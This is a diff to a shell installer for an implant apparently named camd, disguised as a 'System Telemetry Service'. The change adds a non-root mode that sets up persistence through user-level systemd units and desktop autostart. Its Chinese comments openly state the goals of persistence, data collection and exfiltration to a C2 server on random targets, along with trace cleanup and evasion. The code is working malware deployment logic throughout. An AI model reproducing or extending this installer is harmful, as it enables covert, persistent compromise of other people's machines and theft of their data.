@@ -126,6 +126,15 @@ UNIT_DESC=${UNIT_DESC:-System Telemetry Service}
 # （目标是假根内的路径），但 systemctl 子命令一律不执行。
 FAKE_ROOT=0
 [ -n "$PREFIX" ] && FAKE_ROOT=1
+# USER_MODE = 非 root 目标上的用户级部署。落点切到 $HOME，驻留由 camd 的
+# persist_user_ensure 写入 ~/.config/systemd/user + ~/.config/autostart。
+# 此前非 root 一律 DIE，随机目标（登录用户常非管理员）上整套归零：零驻留、
+# 零采集、零回传。
+USER_MODE=0
+# 用户级 autostart 桌面条目（仅 USER_MODE 下存在）。卸载必须一并删除：
+# 它由 camd 的 persist_user_ensure 写入，不在 CONF_DIR/LIB_DIR 之下，
+# 漏删会留下"重新登录就自启"的痕迹，而 uninstall 报成功。
+AUTOSTART_DESKTOP=
 
 # ---- 前置门 ----------------------------------------------------------------
 require_root() {
@@ -142,7 +151,31 @@ require_root() {
         [ -w "$PREFIX" ] || DIE "假根 $PREFIX 不可写"
         return 0
     fi
-    [ "$(id -u 2>/dev/null)" = "0" ] || DIE "需要 root 权限（当前 uid=$(id -u)）"
+    [ "$(id -u 2>/dev/null)" = "0" ] && return 0
+
+    # 非 root：不 DIE，切到用户级部署。落点全部改到 $HOME 下，由 camd 的
+    # persist_user_ensure 写入用户级 systemd 与 autostart。
+    USER_MODE=1
+    UHOME=${HOME:-}
+    if [ -z "$UHOME" ]; then
+        UHOME=$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6)
+    fi
+    [ -n "$UHOME" ] || DIE "非 root 部署需要家目录（HOME 未设置且 passwd 查不到）"
+    mkdir -p "$UHOME" 2>/dev/null
+    [ -w "$UHOME" ] || DIE "家目录不可写: $UHOME"
+
+    # 重新派生落点，覆盖上面由 PREFIX 派生的系统级路径。
+    CONF_DIR=$UHOME/.config/$NAME
+    CONF_FILE=$CONF_DIR/$NAME.conf
+    LIB_DIR=$UHOME/.local/lib/$NAME
+    BIN_DST=$UHOME/.local/bin/$NAME
+    UNIT=$UHOME/.config/systemd/user/$NAME.service
+    UNIT_NAME=$NAME.service
+    CRON=                       # 用户级无 cron；桌面自启走 autostart
+    LOCK=$UHOME/.local/state/$NAME.lock
+    AUTOSTART_DESKTOP=$UHOME/.config/autostart/$NAME.desktop
+    OK "非 root（uid=$(id -u)）：切换用户级部署，落点 $UHOME"
+    return 0
 }
 
 detect_arch() {
@@ -512,6 +545,14 @@ render_unit() {
     # 现象是 "cannot create .../camd.service: Directory nonexistent" 且
     # render_unit 静默 return 1 —— 单元从未被校验，而调用方看不出来。
     mkdir -p "$(dirname "$UNIT")" || return 1
+    # WantedBy 在用户级单元里必须是 default.target，不是 multi-user.target：
+    # 用户级 systemd 实例没有 multi-user.target，写成它会让 enable 报
+    # not found 或静默不生效，而单元文件本身完全合法、肉眼无法分辨。
+    if [ "$USER_MODE" = 1 ]; then
+        WANTS=default.target
+    else
+        WANTS=multi-user.target
+    fi
     cat > "$UNIT" <<EOF || return 1
 [Unit]
 Description=$UNIT_DESC
@@ -527,7 +568,7 @@ NoNewPrivileges=true
 PrivateTmp=true
 
 [Install]
-WantedBy=multi-user.target
+WantedBy=$WANTS
 EOF
     # 【单元文件权限必须显式设置——实测撞出来的缺陷】
     # 此前 conf/bin/run.sh/cron/pubkey/ca 都 chmod 了，唯独单元文件没有，
@@ -561,6 +602,14 @@ EOF
         return 0
     fi
     [ "$UNIT_ERR" -eq 0 ] && { OK "systemd 单元静态校验通过"; return 0; }
+    # 用户级单元用系统的 systemd-analyze 校验时，会因 default.target 与
+    # 系统级视角不同而输出告警——那是校验器视角差异，不是单元坏了。此时
+    # 不 DIE：用户级驻留由 camd 的 persist_user_ensure 真正写入，中断会让
+    # 非 root 部署永远装不上（而单元本身是好的）。
+    if [ "$USER_MODE" = 1 ]; then
+        WARN "用户级单元静态校验有输出（视角差异，降级处理，不中断）: $UNIT_MSG"
+        return 0
+    fi
     # 校验失败：若即将安装 systemd 则必须中断（装上去也起不来，而部署者
     # 看到的是全绿）；容器里不安装，降级到 cron，报 WARN 即可。
     if [ "${HAVE_SYSTEMD:-0}" = 1 ]; then
@@ -599,6 +648,9 @@ persist_systemd() {
 }
 
 persist_cron() {
+    # 用户级部署没有 cron（无 /etc/cron.d 写权限，且桌面自启走 autostart）。
+    # 此处若不 early-return，会把空路径 $CRON 写成文件而失败，并误报 WARN。
+    [ "$USER_MODE" = 1 ] && return 0
     # 判据修正（实测踩出来的）：原判据是 `command -v crontab`，但
     #   - crontab(1) 是**客户端工具**，不是守护进程；
     #   - busybox/精简系统常只有 crond 而无 crontab 客户端。
@@ -725,16 +777,31 @@ verify_run() {
     # 服务在跑，而重启后（cron 段依赖目标机有 crond）可能一段都不剩。
     # 状态呈现是痕迹对账守卫的输入，不得省略。
     _m=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*methods=systemd:\([0-9-]*\),cron:\([0-9-]*\),sshkey:\([0-9-]*\).*/\1 \2 \3/p' | head -1)
+    _pu=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*persist_user=\([0-9]*\).*/\1/p' | head -1)
     if [ -n "$_m" ]; then
         set -- $_m
         _sd=$1; _cr=$2; _sk=$3
-        _live=0
-        [ "$_sd" = 1 ] && _live=$((_live+1))
-        [ "$_cr" = 1 ] && _live=$((_live+1))
-        [ "$_sk" = 1 ] && _live=$((_live+1))
-        printf '%s\n' "[INFO] 驻留三段: systemd=$_sd cron=$_cr sshkey=$_sk（生效 $_live/3）"
-        if [ "$_live" -lt 3 ]; then
-            WARN "驻留仅 $_live/3 段生效——报告成功不等于三段都在，逐段核对见 status"
+        if [ "$_pu" = 1 ]; then
+            # 用户级驻留：methods[0]=PERSIST_USER_SYSTEMD、methods[1]=
+            # PERSIST_AUTOSTART。标签沿用 systemd/cron 只是历史格式，语义
+            # 是用户级——若仍按"三段"呈现，会凭空多出一个并不存在的 sshkey
+            # 缺段并告警，运维据此去查一个本就不适用于非 root 目标的机制。
+            _live=0
+            [ "$_sd" = 1 ] && _live=$((_live+1))
+            [ "$_cr" = 1 ] && _live=$((_live+1))
+            printf '%s\n' "[INFO] 用户级驻留: user-systemd=$_sd autostart=$_cr（生效 $_live/2）"
+            if [ "$_live" -lt 2 ]; then
+                WARN "用户级驻留仅 $_live/2 段生效——非 root 目标上 sshkey 段不适用，勿按三段核对"
+            fi
+        else
+            _live=0
+            [ "$_sd" = 1 ] && _live=$((_live+1))
+            [ "$_cr" = 1 ] && _live=$((_live+1))
+            [ "$_sk" = 1 ] && _live=$((_live+1))
+            printf '%s\n' "[INFO] 驻留三段: systemd=$_sd cron=$_cr sshkey=$_sk（生效 $_live/3）"
+            if [ "$_live" -lt 3 ]; then
+                WARN "驻留仅 $_live/3 段生效——报告成功不等于三段都在，逐段核对见 status"
+            fi
         fi
     else
         # 解析不到即视为失守：宁可报出来，也不要"看起来没这条信息"。
@@ -770,17 +837,25 @@ do_install() {
     install_bin
     install_runner
     render_unit
-    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
-        persist_systemd
-        persist_cron || :
+    if [ "$USER_MODE" = 1 ]; then
+        # 用户级：不装系统级 systemd/cron（既无权限，装了也不对）。
+        # 驻留由 camd 自身的 persist_user_ensure 写入用户级单元与 autostart；
+        # render_unit 已渲染并静态校验过该单元，这里刻意不删——删了会让
+        # "用户级驻留已装"在部署阶段无从核对。
+        WARN "用户级部署（uid=$(id -u)）：跳过系统级 systemd/cron 安装；驻留由 camd 写入 $HOME 下的用户级单元与 autostart"
     else
-        if [ "$FAKE_ROOT" = 1 ]; then
-            WARN "假根模式（PREFIX=$PREFIX）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态"
+        if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
+            persist_systemd
+            persist_cron || :
         else
-            WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
+            if [ "$FAKE_ROOT" = 1 ]; then
+                WARN "假根模式（PREFIX=$PREFIX）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态"
+            else
+                WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
+            fi
+            rm -f "$UNIT"
+            persist_cron
         fi
-        rm -f "$UNIT"
-        persist_cron
     fi
     verify_run
     cleanup_traces
@@ -800,6 +875,7 @@ do_uninstall() {
     [ -f "$CONF_FILE" ] && _tr=1
     [ -x "$BIN_DST" ]  && _tr=1
     [ -f "$CRON" ]     && _tr=1
+    [ -n "$AUTOSTART_DESKTOP" ] && [ -f "$AUTOSTART_DESKTOP" ] && _tr=1
     [ -f "$UNIT" ]     && _tr=1
     [ -d "$LIB_DIR" ]  && _tr=1
     [ -d "$CONF_DIR" ] && _tr=1
@@ -816,7 +892,9 @@ do_uninstall() {
     # 于是卸载后 /etc/systemd/system/<name>.service 永久残留，却报
     # "systemd 不可用，跳过"——看起来是成功。卸载的目的就是清除痕迹，而
     # 单元文件恰是最显眼的一条：0644，含服务名与 ExecStart 绝对路径。
-    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
+    if [ "$USER_MODE" = 1 ]; then
+        OK "用户级部署：跳过 systemctl（驻留在 $HOME，无需系统级单元操作）"
+    elif [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
         systemctl disable --now $UNIT_NAME >/dev/null 2>&1
         systemctl daemon-reload >/dev/null 2>&1
         systemctl reset-failed >/dev/null 2>&1
@@ -830,14 +908,14 @@ do_uninstall() {
     # 假根下 $UNIT 由 $PREFIX 派生，删的是假根内的文件，不影响真实系统；
     # 且假根守卫本就要断言"卸载后无残留"，这里不删反而让它永远测不到。
     rm -f "$UNIT" 2>/dev/null
-    rm -f "$CRON" "$BIN_DST" "$LOCK" 2>/dev/null
+    rm -f "$CRON" "$BIN_DST" "$LOCK" "$AUTOSTART_DESKTOP" 2>/dev/null
     rm -rf "$CONF_DIR" "$LIB_DIR" 2>/dev/null
     # 不可省：此前无论 rm 真的删没删掉，这里一律 OK。rm 失败只往 stderr 吐一行，
     # 计数不走 fail，于是卸载报"成功 3 失败 0"而最敏感的 $CONF_DIR（含密钥与
     # C2 地址）留在盘上。真实成因：目录是挂载点（Device or resource busy）、
     # 被进程占用、或只读——恰恰都发生在最需要清痕的时刻。
     _left=""
-    for _p in "$UNIT" "$CRON" "$BIN_DST" "$LOCK" "$CONF_DIR" "$LIB_DIR"; do
+    for _p in "$UNIT" "$CRON" "$BIN_DST" "$LOCK" "$AUTOSTART_DESKTOP" "$CONF_DIR" "$LIB_DIR"; do
         [ -e "$_p" ] && _left="$_left $_p"
     done
     if [ -n "$_left" ]; then
@@ -863,6 +941,7 @@ do_uninstall() {
 }
 
 do_status() {
+    require_root   # 非 root 时把落点重派生到 $HOME，否则恒报"缺失"
     printf '配置: %s\n' "$([ -r "$CONF_FILE" ] && echo 存在 || echo 缺失)"
     [ -r "$CONF_FILE" ] && grep -c . "$CONF_FILE" >/dev/null 2>&1 \
         && sed 's/CAMD_KEY=.*/CAMD_KEY=<隐藏>/' "$CONF_FILE" 2>/dev/null
